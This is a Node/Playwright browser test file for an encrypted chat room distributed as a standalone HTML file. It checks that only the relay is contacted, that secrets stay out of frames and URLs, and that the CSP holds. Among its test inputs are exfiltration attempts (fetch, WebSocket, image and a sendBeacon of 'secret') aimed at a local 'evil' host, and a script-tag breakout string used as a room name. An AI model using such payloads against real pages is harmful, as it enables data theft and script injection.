// HTML Room in a real browser (docs/html-room/protocol.md).
//   node browser-tests/htmlroom.mjs [http://127.0.0.1:8099]
// Without an address it starts its own Node relay. CHROMIUM_PATH picks the
// browser binary (default: Playwright's Chromium).
//
// Room files are opened from file:// exactly as a person would open one they
// were sent. Checked: two pages chat both ways with delivery states; the only
// network traffic is the configured relay's /hr/ socket; the secret and the
// plain text never appear in a URL or a frame; CSP stops injected scripts,
// connections and images; a room name built to break out of its block stays
// text; a locked file; Chinese error pages for a missing Web Crypto, a broken
// config and a wrong version; blocked storage; the #hr1= web entry clears the
// address bar and talks to a file page in the same room; a reload is a new
// member and the others see it.
import { chromium } from 'playwright';
import { spawn } from 'node:child_process';
import http from 'node:http';
import { mkdtempSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { webcrypto } from 'node:crypto';
if (!globalThis.crypto) globalThis.crypto = webcrypto;
const Core = await import('../dist/hr-core.js');

const ROOT = fileURLToPath(new URL('..', import.meta.url));
let base = process.argv[2];
let server;
if (!base) {
  const port = 18400 + Math.floor(Math.random() * 100);
  server = spawn(process.execPath, [join(ROOT, 'server/server.mjs')], { env: { ...process.env, PORT: String(port), HOST: '127.0.0.1', JOIN_LIMIT: '1000', CONFIG_FILE: '' }, stdio: ['ignore', 'pipe', 'inherit'] });
  await new Promise((done) => server.stdout.on('data', (d) => String(d).includes('listening') && done()));
  base = `http://127.0.0.1:${port}`;
}
const relay = base.replace(/^http/, 'ws').replace(/\/?$/, '/');
const dir = mkdtempSync(join(tmpdir(), 'pt-hr-'));
const template = readFileSync(join(ROOT, 'dist/hr-template.html'), 'utf8');

let failures = 0;
const step = (s) => console.log(`✓ ${s}`);
const check = (ok, s) => { if (ok) step(s); else { failures++; console.error(`✗ ${s}`); } };
const done = async (code) => { await browser?.close(); server?.kill(); evil?.close(); rmSync(dir, { recursive: true, force: true }); process.exit(code); };
setTimeout(() => { console.error('✗ timed out'); done(1); }, 240000).unref();

async function roomFile(name, opts = {}) {
  const config = opts.config ?? await Core.makeConfig({ name: opts.title ?? '', relays: opts.relays ?? [relay], pass: opts.pass ?? null, iter: opts.iter });
  const html = opts.raw ?? Core.fillTemplate(template, config);
  const path = join(dir, `${name}.html`);
  writeFileSync(path, html);
  return { url: pathToFileURL(path).href, config, html };
}

// A host the page must never reach: counts every request and socket that does.
let evilHits = 0;
const evil = http.createServer((req, res) => { evilHits++; res.end('x'); });
evil.on('upgrade', (req, socket) => { evilHits++; socket.destroy(); });
await new Promise((r) => evil.listen(0, '127.0.0.1', r));
const EVIL = `127.0.0.1:${evil.address().port}`;

const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || undefined, args: ['--no-sandbox'] });

// A page that records everything it sends and receives over the network.
async function open(url, { init } = {}) {
  const context = await browser.newContext({ locale: 'zh-CN' });
  const page = await context.newPage();
  const net = { requests: [], sockets: [], sent: [], violations: [] };
  page.on('request', (r) => net.requests.push(r.url()));
  page.on('websocket', (ws) => { net.sockets.push(ws.url()); ws.on('framesent', (f) => net.sent.push(String(f.payload))); });
  page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) net.violations.push(m.text()); });
  if (init) await page.addInitScript(init);
  await page.addInitScript(() => {
    window.__violations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__violations.push(e.violatedDirective));
  });
  await page.goto(url);
  return { page, context, net };
}

const text = (p, sel) => p.locator(sel).innerText();
const send = async (p, t) => { await p.fill('#pt-input', t); await p.press('#pt-input', 'Enter'); };
const ready = (p) => p.waitForFunction(() => /端到端加密已就绪/.test(document.getElementById('pt-status')?.textContent ?? ''), null, { timeout: 30000 });

try {
  // ---- 1. two people, one file, from file:// ----
  const r1 = await roomFile('basic', { title: '周五晚饭' });
  const a = await open(r1.url);
  const b = await open(r1.url);
  await ready(a.page); await ready(b.page);
  check(await text(a.page, 'h1') === '周五晚饭', 'file:// page opens and shows the room name');
  check(/此文件包含完整房间密钥/.test(await text(a.page, '#pt-banner')), 'an unlocked file warns that it holds the whole room key');
  await send(a.page, '你好，B');
  await b.page.getByText('你好，B').waitFor({ timeout: 15000 });
  step('A → B over the relay, end-to-end encrypted');
  await a.page.waitForFunction(() => document.querySelector('.msg.mine')?.dataset.state === 'all', null, { timeout: 15000 });
  check(/全部目标成员已确认/.test(await text(a.page, '.msg.mine .state')), 'A sees "全部目标成员已确认" after B’s sealed receipt');
  await send(b.page, '收到 ✓');
  await a.page.getByText('收到 ✓').waitFor({ timeout: 15000 });
  step('B → A');
  const safety = (p) => p.evaluate(() => document.getElementById('pt-safety').textContent);
  await a.page.waitForFunction(() => /含抗量子/.test(document.getElementById('pt-safety').textContent), null, { timeout: 15000 });
  const safetyA = await safety(a.page), safetyB = await safety(b.page);
  check(/安全码 \d{5} \d{5} \d{5} \d{5} · 含抗量子 ML-KEM/.test(safetyA) && safetyA === safetyB, 'both pages show the same 20-digit safety code, with ML-KEM');

  // ---- 2. what reached the network ----
  const roomId = (await Core.deriveHrRoom(Core.secretOf(r1.config))).roomId;
  const want = `${relay}hr/${roomId}`;
  const all = [...a.net.requests, ...b.net.requests].filter((u) => !u.startsWith('file:'));
  check(all.length === 0, 'the page makes no HTTP requests at all (nothing but its own file)');
  const sockets = [...a.net.sockets, ...b.net.sockets];
  check(sockets.length >= 2 && sockets.every((u) => u === want), 'its only connection is the WebSocket to <relay>/hr/<roomId>');
  const secret = r1.config.secret;
  const secretHex = Buffer.from(Core.secretOf(r1.config)).toString('hex');
  const frames = [...a.net.sent, ...b.net.sent];
  check(frames.length > 4 && frames.every((f) => !f.includes(secret) && !f.includes(secretHex)), 'the secret is in no frame sent');
  check(frames.every((f) => !f.includes('你好') && !f.includes(JSON.stringify('你好，B').slice(1, -1))), 'the message text is in no frame sent (ciphertext only)');
  check(all.every((u) => !u.includes(secret)), 'the secret is in no URL');

  // ---- 3. CSP ----
  const csp = await a.page.evaluate(async (EVIL) => {
    const out = {};
    try { await fetch(`http://${EVIL}/x`); out.fetch = 'went'; } catch { out.fetch = 'blocked'; }
    out.ws = await new Promise((res) => { try { const w = new WebSocket(`ws://${EVIL}/`); w.onerror = () => res('blocked'); w.onopen = () => res('went'); } catch { res('blocked'); } });
    const s = document.createElement('script');
    s.textContent = 'window.__pwned = 1';
    document.body.append(s);
    const img = new Image();
    out.img = await new Promise((res) => { img.onload = () => res('went'); img.onerror = () => res('blocked'); img.src = `http://${EVIL}/p.png`; });
    navigator.sendBeacon?.(`http://${EVIL}/beacon`, 'secret');
    out.eval = (() => { try { return eval('1+1') === 2 ? 'went' : 'x'; } catch { return 'blocked'; } })();
    await new Promise((r) => setTimeout(r, 300));
    out.pwned = window.__pwned === 1;
    out.violations = [...new Set(window.__violations)];
    return out;
  }, EVIL);
  check(csp.fetch === 'blocked', 'CSP blocks fetch to another host');
  check(csp.ws === 'blocked', 'CSP blocks a WebSocket to a host not in the room config');
  check(!csp.pwned, 'CSP blocks an injected inline script');
  check(csp.img === 'blocked', 'CSP blocks loading an image');
  check(csp.eval === 'blocked', 'CSP blocks eval');
  check(['connect-src', 'script-src-elem', 'img-src'].every((d) => csp.violations.some((v) => v.startsWith(d.split('-')[0]))), `violations reported: ${csp.violations.join(', ')}`);
  await new Promise((r) => setTimeout(r, 500));
  check(evilHits === 0, `none of those attempts (fetch, WebSocket, image, beacon) reached the other host (${evilHits} hits)`);
  // Control: the same fetch from a file without the room's CSP does arrive,
  // so the zero above is the CSP's doing.
  const plainPath = join(dir, 'no-csp.html');
  writeFileSync(plainPath, '<!doctype html><p>control</p>');
  const ctl = await open(pathToFileURL(plainPath).href);
  await ctl.page.evaluate((EVIL) => fetch(`http://${EVIL}/control`, { mode: 'no-cors' }).catch(() => {}), EVIL);
  await new Promise((r) => setTimeout(r, 500));
  check(evilHits > 0, 'control: without the CSP the same request does reach that host');
  await ctl.context.close();
  await a.context.close(); await b.context.close();

  // ---- 4. a room name built to break out ----
  const evil = '</script><script>window.__pwned=1</script><b onmouseover=x>';
  const r4 = await roomFile('evil', { config: { ...(await Core.makeConfig({ name: '', relays: [relay] })), name: evil.slice(0, 40) } });
  check(!r4.html.includes('</script><script>window'), 'the built file holds the name only in escaped form');
  const e = await open(r4.url);
  await e.page.locator('#pt-status').waitFor();
  const e4 = await e.page.evaluate(() => ({ pwned: window.__pwned === 1, scripts: document.scripts.length, bold: document.querySelectorAll('b').length, title: document.querySelector('h1').textContent }));
  check(!e4.pwned && e4.scripts === 2 && e4.bold === 0, 'the name runs no script and adds no element');
  check(e4.title === evil.slice(0, 40), 'the name is shown as text, exactly');
  await e.context.close();

  // ---- 5. broken or unknown configurations get a Chinese page, no blank screen ----
  const cases = [
    ['version', { v: 2, name: '', relays: [relay], secret: 'A'.repeat(43) }, /版本与本页面不兼容/],
    ['unknown field', { v: 1, name: '', relays: [relay], secret: 'A'.repeat(43), extra: 1 }, /格式不正确/],
    ['long name', { v: 1, name: 'x'.repeat(5000), relays: [relay], secret: 'A'.repeat(43) }, /名称不符合要求|过长/],
    ['bad relay', { v: 1, name: '', relays: ['https://example.com'], secret: 'A'.repeat(43) }, /中继地址无效/]
  ];
  for (const [label, cfg, msg] of cases) {
    const raw = template.replace(Core.MARK_CONNECT, "'none'").replace(Core.MARK_CONFIG, Core.safeJson(cfg));
    const r = await roomFile(`bad-${label.replace(/ /g, '-')}`, { raw });
    const p = await open(r.url);
    await p.page.locator('h1').waitFor();
    check(msg.test(await p.page.innerText('body')), `config with ${label}: shown in Chinese`);
    await p.context.close();
  }
  const corrupt = template.replace(Core.MARK_CONNECT, "'none'").replace(Core.MARK_CONFIG, '{"v":1,');
  const pc = await open((await roomFile('corrupt', { raw: corrupt })).url);
  await pc.page.locator('h1').waitFor();
  check(/无法读取/.test(await pc.page.innerText('body')), 'corrupt JSON: shown in Chinese');
  await pc.context.close();

  // ---- 6. no Web Crypto / no WebSocket ----
  const r6 = await roomFile('env');
  for (const [label, init] of [
    ['crypto.subtle', () => { Object.defineProperty(Crypto.prototype, 'subtle', { get: () => undefined }); }],
    ['WebSocket', () => { delete window.WebSocket; }]
  ]) {
    const p = await open(r6.url, { init });
    await p.page.locator('h1').waitFor();
    const body = await p.page.innerText('body');
    check(/当前打开方式不支持安全聊天/.test(body) && body.includes(label.split('.').pop()), `without ${label}: Chinese explanation, no blank page`);
    await p.context.close();
  }

  // ---- 7. storage that throws ----
  const p7 = await open(r6.url, { init: () => { Object.defineProperty(window, 'localStorage', { get() { throw new DOMException('blocked', 'SecurityError'); } }); } });
  await ready(p7.page).catch(() => {});
  check(/已连接/.test(await text(p7.page, '#pt-status')), 'a localStorage that throws SecurityError does not stop the room');
  await p7.context.close();

  // ---- 8. a locked file ----
  const pass = Core.randomPass();
  const r8 = await roomFile('locked', { pass, title: '加锁' });
  check(!r8.html.includes('"secret"'), 'a locked file holds no plain secret');
  const l1 = await open(r8.url);
  await l1.page.locator('#pt-pass').fill('wrong-passphrase');
  await l1.page.locator('#pt-unlock button').click();
  await l1.page.getByText('口令不正确').waitFor({ timeout: 20000 });
  step('wrong passphrase: refused in Chinese');
  await l1.page.locator('#pt-pass').fill(pass);
  await l1.page.locator('#pt-unlock button').click();
  const l2 = await open(r8.url);
  await l2.page.locator('#pt-pass').fill(pass);
  await l2.page.locator('#pt-unlock button').click();
  await ready(l1.page); await ready(l2.page);
  await send(l1.page, '锁着的房间');
  await l2.page.getByText('锁着的房间').waitFor({ timeout: 15000 });
  step('two pages that unlocked the same file chat');
  await l1.context.close(); await l2.context.close();

  // ---- 9. the #hr1= web entry, and a file page in the same room ----
  const r9 = await roomFile('web', { title: '网页入口' });
  const link = `${base.replace(/\/$/, '')}/hr.html${Core.fragmentFor(r9.config)}`;
  const w = await open(link);
  await ready(w.page).catch(() => {});
  const f = await open(r9.url);
  await ready(w.page); await ready(f.page);
  check(await w.page.evaluate(() => location.hash) === '', 'the web entry cleared the fragment from the address bar');
  check(/网页模式依赖当前网页提供方/.test(await text(w.page, '#pt-banner')), 'the web entry says it depends on the site’s code');
  check(w.net.requests.every((u) => !u.includes('#') && !u.includes(r9.config.secret)), 'no request from the web entry carries the fragment or the secret');
  check(w.net.sent.every((x) => !x.includes(r9.config.secret)), 'no frame from the web entry carries the secret');
  const sameSite = new URL(base).host;
  check(w.net.requests.every((u) => new URL(u).host === sameSite), 'the web entry talks only to its own site (no third-party requests)');
  await send(w.page, '从网页来');
  await f.page.getByText('从网页来').waitFor({ timeout: 15000 });
  await send(f.page, '从文件来');
  await w.page.getByText('从文件来').waitFor({ timeout: 15000 });
  step('web entry ↔ file page in one room');

  // ---- 10. a reload is a new member; the others see it ----
  await f.page.reload();
  await ready(f.page);
  await w.page.getByText(/离开了房间/).waitFor({ timeout: 15000 });
  await w.page.waitForFunction(() => document.querySelectorAll('#pt-members li').length === 2, null, { timeout: 15000 });
  check(true, 'after a reload the member list has 2 entries again and the departure was announced');
  await send(f.page, '刷新之后');
  await w.page.getByText('刷新之后').waitFor({ timeout: 15000 });
  step('the reloaded page has new keys and is read');
  await w.context.close(); await f.context.close();

  // ---- 11. the generator on the web entry ----
  const g = await open(`${base.replace(/\/$/, '')}/hr.html`);
  await g.page.locator('#mk-relay').fill(relay);
  await g.page.locator('#mk-name').fill('生成器');
  const [download] = await Promise.all([g.page.waitForEvent('download'), (async () => {
    await g.page.locator('#mk-make').click();
    await g.page.locator('#mk-download').click();
  })()]);
  const genPath = join(dir, 'generated.html');
  await download.saveAs(genPath);
  const genHtml = readFileSync(genPath, 'utf8');
  check(genHtml.includes(`connect-src ${new URL(relay).origin};`), 'the generated file’s CSP names only its relay');
  const gp = await open(pathToFileURL(genPath).href);
  await gp.page.locator('#pt-status').waitFor();
  await gp.page.waitForFunction(() => /已连接/.test(document.getElementById('pt-status').textContent), null, { timeout: 20000 });
  check(await text(gp.page, 'h1') === '生成器', 'the file made in the browser opens from file:// and connects');
  await g.context.close(); await gp.context.close();
} catch (err) {
  failures++;
  console.error(`✗ ${err.stack || err}`);
}
console.log(failures ? `\n${failures} failed` : '\nall passed');
await done(failures ? 1 : 0);
